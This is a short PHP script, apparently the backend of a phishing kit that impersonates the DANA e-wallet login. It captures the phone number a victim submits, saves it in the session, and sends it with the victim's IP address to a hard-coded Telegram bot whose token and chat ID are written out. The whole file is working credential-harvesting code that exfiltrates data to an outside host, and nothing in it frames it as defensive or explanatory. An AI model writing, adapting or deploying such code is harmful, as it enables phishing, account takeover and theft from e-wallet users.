<?php
session_start();
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = isset($_POST['nohp']) ? preg_replace('/\D/', '', $_POST['nohp']) : '';

    if (!empty($phone)) {
        $_SESSION['phoneNumber'] = $phone;
        $_SESSION['user_pin'] = "-"; 

        // KONFIGURASI TELEGRAM
        $botToken = "8839179457:AAEXfHKC0IAtVOU_oBXzhGqwZhypKqJnsNo";
        $chatId   = "7938498485";
        $message  = "🔔 *DANA | DATA LOGIN (NOMOR HP)*\n";
        $message .= "━━━━━━━━━━━━━━━━━━\n";
        $message .= "📱 *Nomor HP:* `$phone`\n";
        $message .= "📍 *Status:* User Input Nomor HP\n";
        $message .= "━━━━━━━━━━━━━━━━━━\n";
        $message .= "🌐 *IP:* " . $_SERVER['REMOTE_ADDR'];

        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($message)."&parse_mode=Markdown";
        file_get_contents($url); // Kirim tanpa curl biar simpel
        
        echo json_encode(['status' => 'success', 'phone' => $phone]);
    }
}
?>
